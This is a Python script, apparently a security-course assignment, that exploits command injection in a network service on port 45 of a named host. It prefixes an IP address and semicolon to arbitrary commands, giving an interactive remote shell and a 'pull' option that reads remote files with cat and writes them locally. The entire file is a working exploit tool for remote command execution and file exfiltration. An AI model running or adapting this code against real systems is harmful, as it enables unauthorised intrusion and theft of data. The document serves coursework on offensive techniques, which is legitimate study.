"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time
import sys

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here
result = ""
def execute_cmd(cmd):
    command = "142.93.117.193; "+cmd+'\n'
    #print(command)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(4096)
    s.send(command.encode())
    time.sleep(2)
    new_data = s.recv(4096)
    global result
    result = new_data

    #print(result)

if __name__ == '__main__':
    help_info = "1) shell     Drop into a shell\n2)pull <remote-path> <local-path>     Download files\n3)help     shows this help menu\n4)quit     Quit the shell"
    quit = False
    while not quit:
        user_in = input()
        if user_in == "shell":
            is_exit = False
            while not is_exit:
                comm_in = input()
                if comm_in == "exit":
                    is_exit = True
                comm_in = "echo ENDPOINT; "+comm_in
                
                execute_cmd(comm_in)
                result = str(result)
                #print(result)
                if len(result.split("ENDPOINT ")) != 1:
                    a,b = result.split("ENDPOINT ")
                    print(b)
        elif user_in.split(None,1)[0]=="pull":
            new_in = user_in.split()
            if len(new_in) != 3:
                print(help_info)
            else:

                comm_in = "echo ENDPOINT; "+"cat"+" "+new_in[1]
                execute_cmd(comm_in)
                #print("this is result: "+str(result))
                result = str(result)
                a,b = result.split("ENDPOINT ")
                with open(new_in[2],"w") as f:
                    f.write(str(b))

        elif user_in == "help":
            print(help_info)
        elif user_in == "quit":
            quit = True
        else:
            print(help_info)

    
